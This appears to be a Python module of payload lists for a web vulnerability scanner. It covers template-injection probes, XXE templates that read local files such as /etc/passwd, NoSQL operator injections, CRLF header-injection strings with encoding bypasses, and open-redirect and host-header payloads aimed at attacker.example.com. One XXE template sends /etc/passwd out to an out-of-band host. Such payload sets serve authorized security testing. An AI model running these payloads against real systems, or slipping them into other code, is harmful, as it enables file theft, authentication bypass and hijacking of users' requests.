SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "freemarker/jsp-el"),
    ("#{7*7}", "49", "ruby-el"),
    ("<%= 7*7 %>", "49", "erb"),
    ("{{7*'7'}}", "7777777", "jinja2-str-mul"),
    ("${{7*7}}", "49", "spring-el"),
    ("@(7*7)", "49", "razor"),
    ("{{'a'.constructor}}", "function", "jinja2-class"),
    ("${{{7*7}}}", "49", "spring-alt"),
    ("{{7*7}}${7*7}", "49", "mixed"),
]


XXE_FILE_PAYLOADS = [
    ("/etc/passwd", "root:", "linux-passwd"),
    ("/etc/hostname", "", "linux-hostname"),
    ("/c:/windows/win.ini", "[fonts]", "windows-winini"),
    ("/c:/windows/system32/drivers/etc/hosts", "localhost", "windows-hosts"),
    ("/proc/self/environ", "PATH=", "linux-environ"),
]


XXE_TEMPLATE_BASIC = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{path}">]>\n'
    '<root>&xxe;</root>'
)

XXE_TEMPLATE_OOB = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "{oob}"> %xxe;]>\n'
    '<root>test</root>'
)

XXE_TEMPLATE_ERROR_OOB = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE root [\n'
    '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '  <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM \'http://{oob}/?x=%file;\'>">\n'
    '  %eval;\n'
    '  %exfil;\n'
    ']>\n'
    '<root>test</root>'
)


NOSQL_PAYLOADS = [
    ("ne_null", {"$ne": None}),
    ("ne_invalid", {"$ne": "invalid"}),
    ("gt_empty", {"$gt": ""}),
    ("regex_all", {"$regex": ".*"}),
    ("where_sleep", {"$where": "return true"}),
    ("in_empty", {"$in": []}),
    ("not_regex", {"$not": {"$regex": "^$"}}),
]


CRLF_PAYLOADS = [
    ("crlf_basic", "%0d%0aX-Injected: payload"),
    ("crlf_raw", "\r\nX-Injected: payload"),
    ("lf_only", "%0aX-Injected: payload"),
    ("unicode_crlf", "%E5%98%8A%E5%98%8DX-Injected: payload"),
    ("overlong_crlf", "%C0%8D%C0%8AX-Injected: payload"),
    ("double_encoded", "%250d%250aX-Injected: payload"),
]


OPEN_REDIRECT_PAYLOADS = [
    "//attacker.example.com",
    "https://attacker.example.com",
    "/\\attacker.example.com",
    "https:/attacker.example.com",
    "https:attacker.example.com",
    "////attacker.example.com",
    "/%09/attacker.example.com",
    "/%2F%2Fattacker.example.com",
    "http://attacker.example.com/",
    "//attacker.example.com/%2f..",
]


HOST_HEADER_PAYLOADS = [
    "attacker.example.com",
    "attacker.example.com:80",
    "attacker.example.com:443",
    "127.0.0.1",
    "localhost",
    "attacker.example.com#target.example.com",
    "attacker.example.com@target.example.com",
]

HOST_HEADER_NAMES = [
    "Host",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
]


COMMON_INJECTION_PARAMS = [
    "q", "query", "search", "name", "url", "redirect", "next", "return",
    "return_url", "returnUrl", "callback", "dest", "destination", "path",
    "file", "template", "tpl", "view", "lang", "message", "input",
    "value", "data", "content", "text", "html", "xml", "cmd",
]
